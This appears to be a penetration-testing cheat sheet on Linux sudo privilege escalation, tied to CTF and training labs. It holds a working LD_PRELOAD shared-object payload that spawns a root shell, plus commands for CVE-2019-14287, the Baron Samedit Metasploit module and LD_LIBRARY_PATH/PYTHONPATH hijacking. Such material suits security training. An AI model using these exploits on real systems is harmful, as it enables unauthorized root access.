# sudo privilege escalation

*An excellent reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) (2.0k ⭐). List sudoers with `getent group sudo`.*

[![linprivesc](../../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![picklerick](../../../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
[![linprivesc](../../../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
[![wgelctf](../../../../_badges/thm-p/wgelctf.svg)](https://tryhackme.com/room/wgelctf)
[![easyctf](../../../../_badges/thm-p/easyctf.svg)](https://tryhackme.com/room/easyctf)
[![colddboxeasy](../../../../_badges/thm-p/colddboxeasy.svg)](https://tryhackme.com/room/colddboxeasy)
[![allinonemj](../../../../_badges/thm-p/allinonemj.svg)](https://tryhackme.com/room/allinonemj)
[![chillhack](../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
[![tomghost](../../../../_badges/thm-p/tomghost.svg)](https://tryhackme.com/room/tomghost)
[![ccpentesting](../../../../_badges/thm-p/ccpentesting.svg)](https://tryhackme.com/room/ccpentesting)
[![bruteit](../../../../_badges/thm-p/bruteit.svg)](https://tryhackme.com/r/room/bruteit)
[![unbakedpie](../../../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)
[![sudo_weak_configuration](../../../../_badges/rootme/app_script/sudo_weak_configuration.svg)](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)
[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)
[![shared_objects_hijacking](../../../../_badges/rootme/app_script/shared_objects_hijacking.svg)](https://www.root-me.org/en/Challenges/App-Script/Shared-Objects-hijacking)
![nibbles](../../../../_badges/htb-p/nibbles.svg)
![getsimplecms](../../../../_badges/htb-p/getsimplecms.svg)
[![devvortex](../../../../_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)
[![cozyhosting](../../../../_badges/htb-p/cozyhosting.svg)](https://app.hackthebox.com/machines/CozyHosting)
[![knife](../../../../_badges/htb-p/knife.svg)](https://app.hackthebox.com/machines/Knife)
[![broker](../../../../_badges/htb-p/broker.svg)](https://app.hackthebox.com/machines/Broker)
[![busqueda](../../../../_badges/htb-p/busqueda.svg)](https://app.hackthebox.com/machines/Busqueda)
[![shocker](../../../../_badges/htb-p/shocker.svg)](https://app.hackthebox.com/machines/Shocker)
[![blocky](../../../../_badges/htb-p/blocky.svg)](https://app.hackthebox.com/machines/Blocky)
[![mirai](../../../../_badges/htb-p/mirai.svg)](https://app.hackthebox.com/machines/Mirai)

<div class="row row-cols-lg-2"><div>

If you have [administrative privileges](/operating-systems/linux/_knowledge/index.md#sudo), you can list them with:

```ps
$ sudo -nl # without a password
$ sudo -l # with a password
```

The first section is about settings and environment variables that may be exploited such as [LD_PRELOAD](#ld_preload).

```text!
Matching Defaults entries for [...]:
    [...] # something here
```

The second section is about your [sudoers](/operating-systems/linux/env/files/index.md#etcsudoers) rights. Such commands may be exploited to get root, search the command on [GTOBins #sudo](../tools/gtfobins.md).

```text!
User [...] may run the following commands on [...]:
    (root) /bin/tar
```

➡️ For instance, the user below can run `/bin/tar` as `root`.
</div><div>

📚 Sometimes, instead of root, we may be able to run commands as another user, such as `/opt/script.sh` as user `xxx`. Use `sudo -u xxx`.

🍀 Sometimes, patterns are used in commands/paths. In a path, it means we can use `../`. In a command, we can use any option.

```text!
User [...] may run the following commands on [...]:
    (root) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/vim
    (xxx) NOPASSWD: /opt/*.sh
    (root) /usr/bin/ssh *
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

☠️ If you can only execute the script and not read it, either try to see if the script use an [injectable](../utils/injection.md) parameter or try to find if the source code is available somewhere else <small>(ex: on Git)</small>.

⚠️ A configuration may contains both `env_keep` and `env_reset`.
</div></div>

<hr class="sep-both">

## LD_PRELOAD

[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![linprivesc](../../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![unbakedpie](../../../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)

<div class="row row-cols-lg-2"><div>

If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l` OR if there is no `env_reset`, then it means that we can set `LD_PRELOAD` and run code before executing the command.

The code below replace the gid/uid of the user running the command with `0` <small>(root)</small>. Then, it pops a bash shell <small>(as root!)</small>.

```c
//#include <stdio.h>
//#include <sys/types.h>
//#include <stdlib.h>
void _init() {
    //unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
</div><div>

Compile it with

```shell!
$ cd /tmp
$ gcc -shared -fPIC init.c -o init.so
$ gcc -shared -fPIC init.c -o init.so -nostartfiles
```

Then, call the command that you could run as administrator <small>(`tar` here)</small>, while setting the variable path to your script:

```shell!
$ sudo LD_PRELOAD=/tmp/init.so tar
```

💎 Congratulations, you are `root` now!
</div></div>

<hr class="sep-both">

## Well-known Vulnerabilities

<div class="row row-cols-lg-2"><div>

#### sudo before 1.8.28 (CVE-2019-14287)

[![agentsudoctf](../../../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)

If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.

```ps
$ sudo -u#-1 tar [...]
$ sudo -u#4294967295 tar [...]
```

💎 Congratulations, you are `root` now!
</div><div>

#### sudo before 1.9.5p2 (CVE-2021-3156)

[![metasploitframework](../../../../_badges/htb/metasploitframework.svg)](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework)
[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)

See metasploit module: `exploit/linux/local/sudo_baron_samedit`.

```shell!
msf6> use exploit/linux/local/sudo_baron_samedit
msf6> set SESSION 1
msf6> set LHOST tun0
msf6> run
```
</div></div>

<hr class="sep-both">

## Additional Notes

<div class="row row-cols-lg-2"><div>

#### LD_LIBRARY_PATH

[![shared_objects_hijacking](../../../../_badges/rootme/app_script/shared_objects_hijacking.svg)](https://www.root-me.org/en/Challenges/App-Script/Shared-Objects-hijacking)

While uncommon, if the sudo configuration include `env_keep+=LD_LIBRARY_PATH`, we are able to set a custom folder for `.so`. Refer to [Shared Object Hijacking](../utils/injection.md#library-hijacking).

```shell!
$ sudo LD_LIBRARY_PATH=/path/to/xx/ [...]
```
</div><div>

#### PYTHONPATH

[![unbakedpie](../../../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)

While uncommon, if the sudo configuration include `env_keep+=PYTHONPATH`, we are able to set a custom folder for python modules. Refer to [Shared Object Hijacking](../utils/injection.md#library-hijacking).

```shell!
$ sudo PYTHONPATH=/path/to/xx/ [...]
```
</div></div>